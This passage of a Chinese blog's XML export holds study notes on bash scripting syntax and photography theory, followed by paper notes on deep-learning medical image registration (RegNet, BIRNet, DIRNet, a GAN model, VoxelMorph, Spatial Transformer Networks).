is:$&#123;1&#125;" #第一个参数shift 2echo "Your whole parameter is: $@" #只输出第三个参数以后的参数# 当在命令行运行sh test.sh command one two three时command就是第0个命令，依此类推 1234567if [条件判断式1]; then #在条件判断时，$$表示and，||表示or 指令elif [条件判断式2]; then 指令else 指令fi #结束if之意 123456789101112case $变量名 in 第一个变量内容) 程序段 ;; 第二个变量内容) 程序段 ;; *) 变量内容为其他时执行的程序段 exit 1 ;;esac 123function fname()&#123; 程序段&#125; 12345678910111213141516171819while [条件]do 程序段doneuntil [条件]do 程序段donefor var in con1 con2 con3 #在每次循环中var分别为con1,con2,con3do 程序段donefor ((初始值;终止值;步长))do 程序段done sh [-nvx] scripts.sh执行或debug脚本文件，-n不执行脚本，仅查询语法问题，-v在执行脚本之前先将其内容输出到屏幕上，-x将使用到的脚本内容输出的屏幕上。]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[摄影理论笔记]]></title>
    <url>%2F2020%2F03%2F24%2Fpotograph%2F</url>
    <content type="text"><![CDATA[本文是在中国大学慕课网上观看的轻松学摄影课程的笔记，主要是为自己补充一点摄影理论。 前期和后期应该同时进行 国内摄影作品网站：图虫网、poco（人像摄影） 光圈用来调剂进光量，在光圈中 F 后面的数值越大，光圈越小。小光圈画质会变差，但是会产生星芒。 摄距是指镜头与被摄主体之间的距离。 快门指光线穿过镜头在相机传感器上的成像时间，通过反光板的升起或落下来控制，如1/125s即曝光1/125s。B门模式是手动调节反光板的闭合。快速快门记录光的瞬间，慢速快门记录光的轨迹。 感光度即ISO，它表示相机传感芯片对光线的敏感度。感光度越高，对光线越敏感。高ISO会使照片具有颗粒感，损失更多的细节。星空摄影往往需要利用高感光度。室内（光线暗）拍光线、人文需要高ISO。 色温指光的颜色，用k来表示，表示照片色调冷暖，色温值越低，色调越冷，画面越蓝。通过白平衡来调节，AWB指自动白平衡，日落剪影可以通过提升色温来让画面变暖色调，雾天可以降低色温来增加朦胧感。 曝光指以什么样的亮度来呈现照片，与光圈、快门速度和感光度有关。光圈越大，进入光的量越多，照片越亮；快门速度越慢，进入光的时间越长，照片越亮；此外相机的感光度越高，同样的光线射入相机，照片越亮。 景深指被摄主体前后清晰的距离范围，与光圈、焦距和摄距有关。光圈越大，景深越浅，背景虚化越强；焦距越大，景深越浅，背景虚化越强；摄距越小，景深越浅，背景虚化越强。 横画幅适合拍摄广阔、深渊的景物，环境人像、环境人文常用。竖画幅适合拍摄高耸、挺拔的景物，容易找到简洁的背景、突出主体，人像摄影常用。圆画幅。 光源越广、越近，光线越柔和。 当要拍出雨丝的感觉时，需要有一个比较暗的背景。 色彩搭配可以有对比色搭配、和谐色搭配，还可以是彩色和中性色（黑白灰）搭配。衣服的款式没有颜色重要。白色百搭，黑色是情绪色。 三个原则：1.画面不超过三个主体色；2.色彩的搭配主要是色彩层次的表达；3.色彩搭配要考虑色彩情绪 广角镜头虚化能力较弱，但是可以把人拍高拍瘦；长焦镜头具有最强的背景虚化能力； 日落日出大光比摄影可以用渐变滤镜、摇黑卡、HDR功能等，摇黑卡就是在比较长的延时摄影中在较亮的部分快速均匀的摇晃一个黑色卡片， 慢门风光摄影，夜景车轨拍摄时需要用三脚架固定相机，将ISO设定为最低值，并且要手动对焦，设置小光圈，并调整快门速度 星空摄影，要求天上无云，月光和灯光较暗，好的前景，广角镜头，不是拍摄星轨时ISO应该大一点、慢快门。用手电筒给前景补光，尽量使用暖光源。 后期：对比度、饱和度、锐化、高光、阴影、氛围、色温、柔光（光晕）、虚化、局部工具、画笔工具（画到哪调整哪） 阴影让画面暗的地方变得更暗，高光是将亮的部分变得更亮，提升对比度是让亮的地方更亮，暗的地方更暗 在叶子中间挖个小孔，逆光拍摄、浮空草莓、爱心图片]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】Nonrigid Image Registration Using Multi-scale 3D Convolutional Neural Networks]]></title>
    <url>%2F2020%2F03%2F13%2FRegNet%2F</url>
    <content type="text"><![CDATA[本文是关于论文 Nonrigid Image Registration Using Multi-scale 3D Convolutional Neural Networks 的笔记。 个人觉得本文主要有两个创新点，一个是 ground-truth 的获取方式，是通过对 moving image 变形来得到 fixed image 的；另一个是网络的结构采用了多尺度的输入，并且没有把两个不同大小的图像块拼接成一个双通道的输入（当然图像块大小不同也合并不了），而是分别对其做处理然后再合并。 在之前的方法中，如果某些数据和模型不匹配则会在配准时不会有很好的效果，这时通常会采取修改差异性度量的方式来解决。在这篇论文中不采用手工修改模型的方式，而是用机器学习的方式来自动决定。也就是不显式的定义差异性度量标准。 本文提出的模型叫做 RegNet（不得不说这名字真不咋地，毫无特点），它的输入是多尺度的图像块对，网络的输出是一句具有3个元素的向量，它表示图像块的中心像素的位移。文章声称这时第一个用端到端的 CNN 来解决 3D 非刚性图像配准的模型。 记号：fixed image 记为 $I_F$，moving image 记为 $I_M$，像素 $x$ 从 fixed image 到 moving image 的位移记为 $u(x)$，像素的变换记为 $T(x)=x+u(x)$ 模型的结构如上图所示，每个图像块后面跟着3个卷积层，然后对于相同大小的来自 fixed image 和 moving image 的图像块进行拼接（第一个深绿色部分），然后分别经过2个卷积、一个最大池化和6个卷积操作，然后这两条不同的处理路径得到的结果也会进行拼接（第二个深绿色的部分），然后后面通过4个卷积操作和2个全连接操作最终得到输出——位移向量场 DVF。其中每个卷积层后面都跟着一个 ReLU 激活函数和 batch normalization 操作。 输入时的多尺度是指，一方面取原图的一个 $29\times29\times29$ 的图像块作为输入，另一方面先取原图的一个 $54\times54\times54$ 的图像块，再对其下采样为 $27\times27\times27$ 大小的图像块作为输入。这样分别对 fixed image 和 moving image 进行以上两种采样，然后就得到了4种不同大小（尺度）的输入，所以称之为多尺度输入。 优化器使用的是 Adam 优化器，并且采用衰减的学习率，学习率初始值为0.001，衰减因子为每个 epoch1.25。损失函数采用的是平均剩余距离（the mean residual distance），其公式为 $MAE=\frac{1}{n}\sum^n_{n=1}|DVF’_i-DVF_i|$。其中 $DVF_i’$ 是模型预测的 DVF，而 $DVF$ 是通过以下方式人工合成的。 通过不同的空间频率和幅度来人工合成 DVF，主要分为以下三个步骤： 创建一个和输入图像相同大小的向量场（它作为 moving image），并初始化为0 随机选取 DVF 中的 P 个带你，并随机给位移向量附取值范围为 $[-\theta,\theta]$ 的3个值 用标准差为 $\sigma$ 的高斯核对 DVF 进行平滑处理。 使用三组不同的设置 $\sigma=35、P=80、\theta=8$，$\sigma=25、P=100、\theta=8$，$\sigma=20、P=100、\theta=8$ 来分别生成低中高频的变形 DVF，然后对输入图像应用该 DVF 并采用三次 B 样条插值得到 fixed image。为了得到更真实的图像，最后还在图像中加入标准差为5的高斯噪声。 后面还有一段没读懂，直接把翻译结果放在这：对于单个运动图像，可以产生大量的变形，但是这种方法的缺点是运动图像在每对输入图像中是相同的，因为只有固定图像是随机生成的。因此，我们还生成运动图像的变形版本，并基于此创建新的变形图像。新的运动图像仅使用低频变形生成，以避免过度拉伸（导致外观模糊）。在这一步中，我们使用设置 $\sigma=35、P=100、\theta=8$ 和标准偏差为3的高斯噪声。 从不同模型的结果对比图来看，RegNet 的结果还是不错的，但是比 B-spline 3R 还是差一点。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】双重监督的脑部图像配准网络BIRNet]]></title>
    <url>%2F2020%2F03%2F11%2FBIRNet%2F</url>
    <content type="text"><![CDATA[本文是论文 BIRNet：Brain image registration using dual-supervised fully convolutional networks 的阅读笔记。 一、简介BIRNet 是 Brain Image Registration Networks 的缩写，该网络采用了双重监督的方式，一个监督是 ground-truth，即真实的形变场，另一个监督是图像的差异性，直接测量两幅图像在配准之后图像灰度值之间的差异性。并且采用了以下措施来提高网络的准确率和效率： 使用了分层监督（hierarchical supervision），引入了分层的损失函数，以使得类 U-Net 网络的前些层（即编码器/收缩路径部分）更容易收敛； 间隙填充（gap filling）是在类 U-Net 网络的收缩路径和扩张路径之间插入了额外的卷积层； 多通道输入（multi-channel inputs）是将浮动图像、两幅图像之间的差异图、图像的梯度图同时作为输入； 数据增强（data augmentation）来扩大训练样本。 上图是整个网络的结构示意图。 一些记号：形变场记作 $\phi$，subject image（即浮动图像）记作 $S$，template image（即固定图像/模版图像）记作 $T$。 二、网络结构1. 双重监督该网络采用了双重监督的方式，一个监督是 ground-truth，即真实的形变场，另一个监督是图像的差异性，直接测量两幅图像在配准之后图像灰度值之间的差异性。ground-truth 可以让模型快速的学习图像的形变以及让形变场具有正则化（即光滑性），图像的差异性可以避免对估计得到的 ground-truth 的过度依赖。 上图为 BIRNet 的损失函数示意图。 因为有两个监督，所以损失函数也包括两部分，一部分是预测的形变场和 ground-truth 形变场（通过其他已有的模型或方法得到的）之间的损失函数 $loss_{\phi}$，具体使用的是两个形变场之间的欧氏距离 $loss_\phi=\frac{1}{N}||\phi-\phi_g||_2^2$，N 是体素的个数。另一部分是固定图像和经过形变之后的浮动图像之间的差异损失函数 $loss_M$，其计算公式为 $loss_M=\frac{1}{N}\sum_u||S(u+\phi(u))-T(u)||^2_2$，其中 $u$ 是体素的坐标，$\phi(u)$ 是体素 $u$ 的位移。 $loss_\phi$ 的取值范围为 [-30, 30]，而 $loss_M$ 的取值范围为 [-255, 255]，所以为了让两个损失函数保持平衡，在计算时 $loss_M$ 会先乘以 0.1，总的损失函数是两者的结合，可以表示为：$$loss=\alpha\cdot loss_\phi+\beta\cdot loss_M,\quad \alpha,\beta\geq0,\quad\alpha+\beta=1$$在训练的初试阶段，为了加速训练的收敛并让预测的形变场光滑，可以采用较大 $\alpha$ 值，也就是多从 ground-truth 中学习，在训练后期，为了对预测的形变场进行微调和完善，可以采用较大的 $\beta$ 值，也就是多从两幅图像之间的差异性中学习。在具体操作中，在训练的前 5 个 epochs 会采用 $\alpha=0.8,\beta=0.2$ 的设置，在训练的后 5 个 epochs 会采用 $\alpha=0.5,\beta=0.5$ 的设定。 我个人的理解是如果只用 ground-truth 作为监督标签，那么训练结果的上限就是 ground-truth 了，所以还要设定其他的标签作为监督的方式，以突破 ground-truth 的局限。 2. 分层监督在传统的 U-Net 中，由于在网络最终得到输出之后才计算损失函数，然后反向传播更新网络参数，所以网络的前半部分比后半部分收敛的要慢。我个人的理解是网络太深了之后容易导致梯度消失，所以反向传播时更新不了那么深或者深层的（前面的）网络参数更新的幅度要小，所以收敛的慢。 为了解决这个问题，在网络的每一个 level 都加入了个一个损失函数，用来直接监督网络前半部分的训练。网络有三层，高分辨率层（最上面一层）的输出是 $24\times24\times24$ 大小的形变场块（patch）$\phi_g^{high}$，中分辨率层（中间一层）的输出是 $14\times14\times14$ 大小的形变场块（patch）$\phi_g^{mid}$，低分辨率层（最下面一层）的输出是 $9\times9\times9$ 大小的形变场块（patch）$\phi_g^{low}$。最后总的损失函数 $loss_\phi$ 为：$$loss_\phi=loss_\phi^{high}+loss_\phi^{mid}+loss_\phi^{low}$$ 3. 间隙填充在 U-Net 的收缩路径中使用的是两个 $3\times3\times3$ 的卷积层，后面跟着 ReLU 激活函数和 batch normalization，然后是一个 $2\times2\times2$ 的最大池化层，其步长为2。在扩张路径使用的是一个 $2\times2\times2$ 是反卷积层，后面是两个 $3\times3\times3$ 的卷积层，最后一层是一个 $1\times1\times1$ 的卷积层用来实现全连接。 上图为间隙填充示意图，网络黑色的部分是传统的 U-Net，绿色的部分是间隙填充的卷积操作，个人感觉特征图 A 的虚线少了一个从 Conv 指向图片的箭头。 特征图 A 和 B 分别是收缩路径和扩张路径的中间结果，两者存着着较大的差异，前者像原图，后者像形变场，并且特征图 B 有点不连续。为了解决这个问题，文章在收缩路径和扩张路径的同一 level 的层之间加入了额外的卷积层。进行过间隙填充得到的特征图 C 就和特征图 B 比较相像了。 4. 多通道输入 输入包括浮动图像、两幅图像的差异图和梯度图。两幅图像的差异图是通过计算图像 $S$ 和 $T$ 之间的差异得到的，梯度图提供了图像的边界信息。上图分别是原图、两幅图像的差异图和梯度图。 5. 其他设置优化器采用的是 Adam 优化器，学习率在训练的前期为 0.001，在训练的后期为 1e-8，输入的 patch 大小为 $64\times64\times64$，相邻 patch 之间是有重叠的，其步长为 24，和输出的 patch 大小相同，输出 patch 表示输入 patch 中央的像素周围的位移场，这样就保证了输出正好组成一个完整的没重叠的形变场。 三、总结 上图是几种模型的对比，黄色框中的部分是几种方法差异比较明显的部分，可以发现 BIRNet 达到了很好的配准效果。 上图是网络模型的具体配置。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于深度学习的端到端无监督配准模型——变形图像配准网络（Deformable Image Registration Network, DIRNet）]]></title>
    <url>%2F2020%2F03%2F04%2FDIRNet%2F</url>
    <content type="text"><![CDATA[本文是论文 End-to-End Unsupervised Deformable Image Registration with a Convolutional Neural Network 的阅读笔记。 文章提出了一种端到端的无监督配准模型——变形图像配准网络（Deformable Image Registration Network, DIRNet），并在手写数字数据集 MNIST 和心脏电影 MR 数据集 SCD 上做了实验。这个模型包括三个部分：一个由 CNN 实现的回归器、空间变换网络、重采样器。该模型是第一个基于深度学习的无监督端对端的图像配准模型。 一、网络结构 DIRNet 由回归器、空间变换器和重采样器三部分组成。如上图所示，回归器以 fixed image 和 moving image 的图像块作为输入，其输出的形变参数作为空间变换器的输入，空间变换器产生一个形变场，然后输入到重采样器中，重采样器根据形变场对 moving image 进行变换，得到配准之后的图像。整个网络通过通过计算 fixed image 和 warped moving image 之间的相似性作为损失函数来更新网络的参数。 1. 回归器回归器的输入是 fixed image 和 moving image 中对应的图像块（patch），它利用 CNN 预测一个局部的形变参数。其网络结构具体是：4 个 $3\times3$ 的卷积层，采用 0 填充，并且使用 $2\times2$ 的下采样层，下采样层具体使用的是平均池化操作，然后是一个 $1\times1$ 的卷积层作为全连接层。每一层中都使用了批正则化，除最后一个卷积层外每个卷积层后都跟着一个指数线性单元（ELU）作为激活函数。 2. 空间变换器空间变换器的输入是回归器预测的形变参数，其输出是一个位移向量场（形变场），具体的，空间转换器会根据薄板样条产生一个形变场，这种更适合于预测全局的形变场，即输入是整幅图像；当输入是图像块时，预测的是局部的形变场，这时 B 样表转换则更适合。 3. 重采样器重采样器的输入是一个形变场，其输出是变形后的 moving image。 模型的优化器采用的是随机梯度下降优化器，图像之间的相似度损失采用的是归一化的互相关。 二、实验结果1. MNIST 数据集在处理 MNIST 数据集时，由于有 0~9 十种不同的手写数字，所以是对每一类的图像分别进行训练的，并且在训练时随机选择一个图片作为 fixed image。 上图是对 MNIST 数据集进行训练的结果，第一行是每一类图像取平均值之后得到的，第二行是 fixed image，第三行是配准之后的结果。 2. SCD 数据集为了评估不同的网络设置对效果的影响，在 SCD 数据集上进行训练时，以第二部分网络结构中提到的设置作为基准，分别对以下内容做了实验： 为了评估不同的下采样方法的影响，DIRNet-A1 模型使用的是最大池化操作，DIRNet-A2 模型使用的是步长为 2 的卷积操作。 为了评估不同的空间变换器的影响，DIRNet-B1 使用的是二次 B 样条变换器，DIRNet-B2 使用的是薄板样条变换器。 为了评估不同大小的接收野（即patch大小）的影响，DIRNet-C1 使用的是有重叠的图像块，该图像块大小与B样条控制点的捕获范围一致，这是通过在最终池层前后添加额外的 $3\times3$ 的卷积层来实现的；DIRNet-C2 通过将最后一层 $1\times1$ 的卷积层替换为 $3\times3$ 的卷积层，然后是一个下采样层、两个 1024 节点的完全连接层和一个 $16\times16$ 的二维控制点的最终输出层来分析每个控制点的全图像切片。 上图是根据上述不同的实验设置得到的训练结果，其中每一行分别表示配准之前的损失、SimpleElastix 模型训练的损失以及不同设置的 DIRNet 的损失。$95^{th} SD$ 是 surface distance（表面距离）的缩写，$MAD$ 是 mean absolute surface distance（平均绝对表面距离的缩写）。在所有的模型中，B2 训练时收敛的较慢，但是效果比基准网络要好，C1 的效果是最好的。 上图是 DIRNet 和 SimpleElastix 配准结果的对比图，可以看出来 DIRNet 的配准结果更接近于 fixed image。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于生成对抗网络（GAN）的无监督医学图像配准模型]]></title>
    <url>%2F2020%2F03%2F04%2FGAN-Registration%2F</url>
    <content type="text"><![CDATA[本文是论文 Adversarial Similarity Network for Evaluating Image Alignment in Deep Learning based Registration（基于深度学习的配准中用相似性对抗网络来评估图像的对齐）的阅读笔记。 一、简介一般的无监督配准模型是需要指定相似性指标，然后通过神经网络来最大化两幅图像之间的相似性，从而达到配准的目的。常用的相似性指标有平方差（SSD）和互相关（CC）等。但是这些相似性指标不是对所有数据集都适用的。 本文提出了一种基于生成对抗网络（GAN）的无监督配准模型，在训练时不需要 ground-truth，也不需要指定图像之间的相似性度量指标。 上图是该模型与其他模型的配准结果对比示意图，对比 黄色方框中的区域可以看出，本文提出的模型输出结果更接近于 template image。 二、记号本文中 fixed image 被称为 template image，记作 $T$；moving image 被称为 subject image，记作 $S$；形变场 $\phi$ 就是使得 $S$ 和 $T$ 最相似的形变场，可表示为：$$\phi=\arg_\phi\min M(S\circ\phi,T)+Reg(\phi)$$其中 $S\circ\phi$ 表示形变场作用在 $S$ 上生成扭曲后的图像，$M(S\circ\phi,T)$ 表示两幅图像的差异性，$Reg(\phi)$ 是正则项，表示形变场 $\phi$ 的平滑性。 在该模型中，生成器是一个配准网络 $R$，它用来预测一个形变场 $\phi$；判别器是一个判别网络 $D$，它用来判断两幅图像之间的相似性概率 $p$，$p\in[0,1]$。 三、网络结构该网络模型由三部分组成——配准网络、变形转换层和判别网络。 1. 配准网络采用的是类似于 U-Net 的网络结构，使用三维的 patch 作为输入，图像对 $(S,T)$ 通过配准网络可以得到一个位移向量场（形变场）$\phi$。 2. 变形转换层根据配准网络预测出的形变场 $\phi$，对图像 $S$ 做变换，得到扭曲后的图像 $S\circ\phi$。 3. 判别网络 判别网络用来判别输入的两个图像块是否相似，并输出一个相似性概率 $p$。 上图是判别网络的结构示意图，每个卷积层后面跟着一个 ReLU 激活函数，并且卷积采用 0 填充的方式。 上图是整个网络的结构示意图。如上图所示，一个变形转换层起到了连接配准网络和判别网络的作用，它可以把配准网络产生的形变场 $\phi$ 和图像 $S$ 作为输入，得到根据形变场扭曲后的图像 $S\circ\phi$ ，再将扭曲后的图像和图像 $T$ 输入到配准网络。输入时，不是输入整幅图像，而是输入大小为 $64\times64\times64$ 的图像块（patch），并得到一个大小为 $24\times24\times24$ 的形变场。 四、训练1. 判别网络的训练判别网络的输入有两种，一种是正例（positive case）$P^+$，一种是负例（negative case）$P^-$。正例是预先定义好的已对齐的图像对（即两个相同的图像 $T$ 的图像块），此时判别网络输出的预期值是1，表示这对图像是相似的。负例是从配准网络中产生的尚未配准好的图像对（即一个是图像 $T$ 的图像块，另一个是相同大小的，经过配准后的图像 $S$ 的图像块），此时判别网络输出的预期值为0，表示这对图像是不相似的。正例时判别网络的损失函数为：$L_D(p)=\log(1-p)$，负例时判别网络的损失函数为 $L_D(p)=\log(p)$，$p$ 是判别网络输出的图像对的相似度概率。 理想中的正例中的图像对是完全相似的，但这在现实中是不可能的，因此作者在正例的图像对中加入了扰动，即图像 $S$ 被 $a\cdot S+(1-a)\cdot T$ 代替，其中 $0&lt;a&lt;1$，在开始训练时，设置 $a=0.2$，在后期的训练中设置 $a=0.1$。换句话说，在正例当中，输入一个是图像 $S$ 的一个 patch，另一个是 $a\cdot S+(1-a)\cdot T$ 的一个 patch。 2. 配准网络的训练因为配准网络产生的图像对属于负例，所以配准相似性损失为：$$L_R(p)=\log(1-p),\quad p\in P^-$$正则化损失为：$$L_{reg}(\phi)=\sum_{v\in \mathbb{R}^3}||\nabla\phi(v)||^2$$其中，$v$ 表示体素的位置。 配准网络总损失为配准相似性损失加正则损失，可表示为：$$L=L_R(p)+\lambda L_{reg}(\phi)$$其中 $\lambda$ 是正则项的权重，在实验中设置为 1。 五、其他设置优化器是 Adam，学习率初始值设为 0.001，没迭代 50K 次，以 0.5 的权重衰减，当判别网络无法分辨出是正例还是负例时，整个网络的训练就收敛了。 在论文中我有两个地方没搞明白，一个是判别网络的正例和负例，另一个是在判别网络训练时的对正例图像添加的扰动，这两部分等我阅读了相关代码之后再做补充修正。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】VoxelMorph-无监督医学图像配准模型]]></title>
    <url>%2F2020%2F02%2F28%2FVoxelMorph%2F</url>
    <content type="text"><![CDATA[本文是无监督的医学图像配准模型——VoxelMorph 的论文笔记。 变形配准（Deformable registration）策略通常包括两步：第一步是可实现全局对齐的仿射变形，然后是具有自由度更高的更缓慢变形变换。本文主要是关心第二步。 一、记号$f$ 和 $m$ 分别表示 fixed image 和 moving image，$\phi$ 表示从 $f$ 的坐标映射到 $m$ 的坐标的配准场，$u$ 表示一个位移向量场。$g_\theta(f,m)=u$ 是 VoxelMorph 所表示的配准函数，其中 $\theta$ 是网络的模型，$u$ 是位移场。对与体素 $p$ 来说，$u(p)$ 就是让 $m$ 中的体素和 $f$ 中的体素对齐到相似位置的位移。 二、前人工作 基于学习就是指经过神经网络训练的(训练就是学习)，训练出来的参数函数是共享的（只需训练一次得到参数，以后配准都使用这些参数）；不基于学习是指传统的配准方法，每次配准都要对度量函数进行优化，参数不共享。 由于传统的配准方法是对每一个图像对进行优化，所以速度非常慢。有监督的神经网络训练的方式虽然提升了速度，但需要大量的标注信息。无监督的神经网络训练具有速度快、不需要标注信息的特点。 这一部分是自己总结的，论文中没有。 三、VoxelMorph 网络结构 上图是 VoxelMorph 网络的示意图，下方浅蓝色区域是可选的。fixed image 和 moving image 通过一个卷积神经网络 $g_\theta(f,m)$ 产生一个配准场（可以理解为形变场）$\phi$，然后将该形变场作用在 moving image 上得到更接近 fixed image 的 moved image $m\circ\phi$。形变场有一个平滑损失 $L_{smooth}(\phi)$，moved image 和 fixed image 之间有一个相似性损失 $L_{sim}(f,m\circ\phi)$。如果是有监督（即有分割标签）的训练，则产生的形变场还会作用在 moving image 对应的分割标签上，得到 moved segmentation，并计算它与 fixed image segmentation 之间的分割损失 $L_{seg}(s_f,s_m\circ\phi)$。 上图是本论文中使用的用来实现 $g_\theta(f,m)$ 的 U-Net 结构的 CNN 示意图，矩形下方的数字表示当前层三维图像的体积与输入的三维图像的关系。 四、空间变换函数基于空间变换网络（STN），来缩小 moving image 和 fixed image 之间的区别，并预测一个形变场，然后将形变场作用到 moving image 上得到与 fixed image 更相似的 moved image，即 $m\circ\phi$。 五、损失函数VoxelMorph 中有两种训练策略或者说损失函数，一种是基于图像的灰度值来最大化一个关于图像之间的匹配程度的目标函数，另一种除此之外还使用了诸如图像的分割标签等辅助信息。显然，第一种策略是无监督的，第二种是有监督的。 1. 无监督的损失函数无监督的损失函数包括两部分：相似性损失 $L_{sim}$ 和平滑损失 $L_{smooth}$ ，相似性损失是衡量图像之间相似性的，而平滑损失是使产生的形变具有空间平滑性的。无监督损失函数可以表示为：$$L_{us}(f,m,\phi)=L_{sim}(f,m\circ\phi)+\lambda L_{smooth}(\phi)$$相似性损失可以是像素级的 均方误差，通常当 $f$ 和 $m$ 具有相似的灰度值分布的时候使用这种形式；也可以是 $f$ 和 $m\circ\phi$ 之间局部的 互相关，通常当 $f$ 和 $m$ 来自不同的扫描设备或数据集时使用这种形式。 2. 有监督的损失函数有监督的损失函数包括两部分：一部分是无监督损失，另一部分是两幅图像的分割标签之间的 Dice 损失。有监督的损失函数可以表示为：$$L_a(f,m,s_f,s_m,\phi)=L_{us}(f,m,\phi)+\gamma L_{seg}(s_f,s_m\circ\phi)$$其中 $s_f,s_m$ 分别为 fixed image 和 moving image 对应的分割标签，需要注意的是分割损失只在训练的时候使用，在测试的时候因为没有标签所以不用。 对于分割损失来说，产生的形变场也会作用在 moving image 的分割标签上，得到 moved image 对应的分割标签，然后计算它与 fixed image 的分割标签之间的 Dice 损失。 实践证明，在使用了额外的分割信息之后，训练的效果得到了提升。 六、实验所有的实验都是在3D图像上做的，但是为了方便表示，示意图中画的都是2D的。 1. 实验配置实验选用了有3731张T1权重的脑部MRI的数据集，包括OASIS、ABIDE、ADHD200 、MCIC、PPMI、HABS、Harvard GSP和the FreeSurfer Buckner40数据集。在预处理阶段先将图像重采样为$256\times256\times256$大小，进行仿射空间正则化，并使用FreeSurfer工具提取脑部（去除头骨）并获取分割结果，再将结果图裁剪到$160\times192\times224$大小。训练集、验证集和测试集包含的图像数分别为3231、250和250。评价指标选用的是DICE值，它可以衡量图像的重叠情况。并使用Jacobian矩阵$J_{\phi}(\mathbf{p})=\nabla \phi(\mathbf{p}) \in \mathcal{R}^{3 \times 3}$来捕获体素$p$附近形变场$\phi$的局部属性，计算所有满足$|J_\phi(p)|\le 0$的非背景体素，其中变形不是微分同胚的。使用ANTs软件包里的SyN配准算法和NiftyReg作为两个baselilne，VoxelMorph的设置为：选用学习率为$1e^{-4}$的ADAM优化器，迭代1.5w次。 2. 实验一实验一做了基于图谱的（atlas-based）配准实验，使用不同的正则化参数$\lambda$训练网络。图谱表示一个参考图像或平均图像，通常是通过联合和反复校准MRI图像数据集并将它们平均在一起来构建的。它和fixed image的作用相同，但是fixed image只是一张图片，而atlas是图像数据集的平均。 上表展示了采用不同模型的平均DICE值和运行时间，VoxelMorph的DICE值差不多可以和ANTs以及NiftyReg相媲美。在时间上，同样运行在CPU上时，VoxelMorph平均比ANTs快150倍，比NiftyReg快40倍。 模型的配准效果对比图如下： 下图是采用不同配准方法，脑部不同结构配准效果的DICE值。 3. 实验二实验二做了超参敏感性分析，下图展示了模型对于平滑正则参数$\lambda$的选择具有较好的鲁棒性。 4. 实验三实验三研究了训练集大小对效果的影响，在该部分选用的是基于MSE的VoxelMorph，使用原训练集不同大小的子集进行训练，当数据集较小时，效果会有轻微的降低，当训练集大小达到一定程度时，再增加训练集大小也不会有明显的提升。 5. 实验四实验四展示了模型在具有人工分割标签的数据集上配准效果。在实验二基于谱图的配准模型上测试Buckner40数据集上的配准，这个数据集包含专家手工描绘的解剖结构，在这里用来评估。结果如下表，其中”inst”表示使用了特例优化的。 6. 实验五实验五还使用随机的训练图像对作为模型的输入，并在未使用过的测试集上做测试。实组间配准，将VoxelMorph每层的特征数加倍，发现NCC损失比MSE损失更具有鲁棒性。结果如下表所示，其中$\times2$的表示将每层特征数加倍的模型。 7. 实验六实验六验证了使用分割标签对结果的影响，一共有30张带有分割标签的图像。使用MSE损失和$\lambda=0.02$进行训练。考虑两种情况，一种是有解剖结构标签的，另一种是有粗分割标签的。下图展示了用FreeSurfer得到分割标签和直接使用带人工分割标签的Buckner40数据集的训练情况，其中分为了只用1张图训练、用15张（一半）图训练、用30张（全部）图训练的结果。 下图是不同$\lambda$值，不同训练集下的对比结果。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】Spatial Transformer Networks(STN)-用于医学图像配准的空间变化网络]]></title>
    <url>%2F2020%2F02%2F28%2FSTN%2F</url>
    <content type="text"><![CDATA[本文是用于医学图像配准的空间变化网络（Spatial Transformer Networks, STN）的论文笔记。 STN 可以插入到已有的卷积神经网络结构中，让 CNN 具有空间变换的能力，不仅可以让网络能够提取出一张图片中所关心的区域，而且还可以把图片转换为规范的形式，以更方便下层网络进行处理。对于多通道的输入来说，产生的变形将会作用于每一个通道。 另一种表述就是 STN 能够根据分类或者其它任务自适应地将数据进行空间变换和对齐。比如 CNN 在分类时，通常需要考虑输入样本的局部性、平移不变性、缩小不变性和旋转不变性等，以提高分类的准确度，这些不变性就对应着图像的裁剪、平移、缩放和旋转等，而 STN 可以实现这些。 上图的 (a) 列是经过扭曲变形的 MNIST 手写数字图像，(b) 列图像中的框是 STN 中的定位网络预测出来的变换（可以理解为感兴趣的区域），(c) 列图像是 STN 的输出结果，即经过规范化和对齐后的手写数字图像，(d) 列是分类预测结果。 空间变换器（spatial transformer）可以分为三个部分：第一部分是定位网络（localisation network），它可以根据输入的图像/特征图得到一组空间变换的参数；第二部分是网格生成器（grid generator），它可以根据第一部分预测出来的空间变换参数，生成一个采样网格，即输出图像/特征图的每个点是从输入图像/特征图中哪些点采样而来的；第三部分是采样器（sampler），它可以将采样网格作用在输入特征图上，并产生相应的输出特征图。 上图是空间变换器的示意图，U 是输入特征图，V 是输出特征图。 定位网络 可以根据输入特征图 U 来生成空间变换 $T_\theta$ 的参数 $\theta$，当变换的类型不同时，参数 $\theta$ 的大小也是不同的，比如在二维仿射变换中 $\theta$ 是 6 维的。 网格生成器 假设输出特征图对应的网格是一个规则网格，即网格的每个坐标值都是整数，且相邻坐标之间的间隔一致。通过定位网络，我们已经得到了输出特征图中的每个点对应输入特征图中的哪些点。这样我们就可以利用输出特征图的网格和空间变换参数计算得到所对应的输入特征图对应的采样网格（即由目标坐标得到源坐标），如下公式所示： 其中 s 是 source 的缩写，表示源图像中的坐标；t 是 target 的缩写，表示目标图像中的坐标。$A_\theta$ 是二维仿射变换矩阵。 采样器 直接简单地从源像素数组中复制像素值是不可行的，因为仿射变换后的坐标 $(x^s,y^s)$ 可能为实数，但是像素位置坐标必须是整数。为了解决像素值缺失问题，必须进行插值。插值核函数很多，源码中选择了论文中提供的第二种插值方式——双线性插值。双线性插值的示意图和计算公式如下图所示： 但是上图中的计算公式非常不优雅，DeepMind 在论文利用 max 与 abs 函数，改写成一个简洁、优雅的插值等式：$$V_i^c=\sum_n^H\sum_m^W U_{nm}^c\max(0,1-|x_i^s-m|)\max(0,1-|y_i^s-n|)$$其中 $V_i^c$ 表示输出特征图中第 $c$ 个通道、第 $i$ 个像素（即坐标 $(x_i^t,y_i^t$）处的像素值；$U_{nm}^c$ 表示输入特征图中第 